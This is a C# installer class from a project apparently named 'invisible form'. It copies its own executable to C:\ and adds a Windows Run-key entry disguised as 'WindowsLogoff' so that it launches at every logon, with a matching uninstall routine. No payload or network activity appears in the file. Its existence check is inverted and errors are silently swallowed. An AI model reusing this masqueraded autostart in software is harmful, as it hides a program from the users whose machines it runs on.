using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using Microsoft.Win32;
using System.Windows.Forms;

namespace FormInvisivel
{
    public class Installer
    {
        public static void Install()
        {
            CopyFile();
            RegisterStartup();
        }

        public static void Uninstall()
        {
            DeleteFile();
            DeleteRegistryStartup();
        }

        private static void DeleteFile()
        {
            string sourcePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string targetPath = String.Format("C:\\{0}", System.Reflection.Assembly.GetExecutingAssembly().Location.Split('\\').Last());

            try
            {
                // Ensure that the target does not exist.
                if (File.Exists(targetPath))
                    File.Delete(targetPath);
            }

            catch
            {
                // Console.WriteLine("Double copy is not allowed, which was not expected.");
            }
        }

        private static void CopyFile()
        {
            string sourcePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string targetPath = String.Format("C:\\{0}", System.Reflection.Assembly.GetExecutingAssembly().Location.Split('\\').Last());

            try
            {
                // Create the file and clean up handles.
              //  using (FileStream fs = File.Create(sourcePath)) { }

                // Ensure that the target does not exist.
                if (!File.Exists(targetPath))
                    File.Delete(targetPath);

                // Copy the file.
               // File.Copy(sourcePath, targetPath);
                System.IO.File.Copy(sourcePath, targetPath, true);

                // Try to copy the same file again, which should succeed.
                //     File.Copy(path, path2, true);
                //   Console.WriteLine("The second Copy operation succeeded, which was expected.");
            }

            catch
            {
                // Console.WriteLine("Double copy is not allowed, which was not expected.");
            }
        }

        private static void RegisterStartup()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rkApp.SetValue("WindowsLogoff", Application.ExecutablePath.ToString()); // Isso fará com que o aplicativo INICIE junto com o windows
        }

        private static void DeleteRegistryStartup()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (rkApp.GetValueNames().Contains("WindowsLogoff"))
                rkApp.DeleteValue("WindowsLogoff");
        }

        public static bool IsInstalled()
        {
            string sourcePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string targetPath = String.Format("C:\\{0}", System.Reflection.Assembly.GetExecutingAssembly().Location.Split('\\').Last());

            return File.Exists(targetPath);
        }
    }
}
